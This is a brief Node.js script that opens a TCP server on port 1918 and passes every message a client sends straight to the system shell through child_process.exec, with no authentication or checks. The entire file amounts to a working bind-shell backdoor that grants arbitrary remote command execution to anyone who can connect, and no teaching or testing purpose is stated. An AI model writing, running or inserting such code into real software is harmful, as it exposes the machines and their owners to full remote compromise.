const net = require("net");
const exec = require("child_process").exec;

const serverSocket = new net.createServer(conn => {
  console.log("Client connected");
  conn.write("Send command");

  conn.on("data", data => {
    if (data.toString() === "exit") {
      console.log("Connection ended");
      conn.end();
    } else {
      exec(data.toString(), (err, stdout) => {
        if (err) {
          throw err;
        }
        console.log(stdout);
      });
      conn.write("Give me more");
    }
  });
});

serverSocket.listen(1918, () => {
  console.log("Connected to localhost 1918");
});
